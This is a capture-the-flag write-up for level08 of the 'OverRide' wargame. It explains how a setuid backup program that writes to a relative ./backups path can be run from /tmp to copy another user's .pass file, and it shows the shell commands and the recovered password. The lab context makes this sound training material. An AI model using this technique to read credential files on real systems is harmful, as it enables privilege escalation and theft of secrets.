# Level level08

## how to login

username: level08

password: 7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC

## Goal

read `.pass` as user `level09`

## Actually doing something

Looking at the disassembled code for `level08`, we see a few functions that "back up" any file specified into the `./backups` directory. Using it from the level08 home doesn't work since it doesn't have the permissions for ~level08/backups (it is running as user level09).

Hence we can just run run it from /tmp and target level09's password file!

```bash
level08@OverRide:~$ cd /tmp
level08@OverRide:/tmp$ mkdir ./backups
level08@OverRide:/tmp$ ~/level08 /home/users/level09/.pass
ERROR: Failed to open ./backups//home/users/level09/.pass
level08@OverRide:/tmp$ mkdir -p ./backups//home/users/level09/
level08@OverRide:/tmp$ ~/level08 /home/users/level09/.pass
level08@OverRide:/tmp$ cat ./backups/home/users/level09/.pass
fjAwpJNs2vvkFLRebEvAQ2hFZ4uQBWfHRsP62d8S
```

Short n easy!
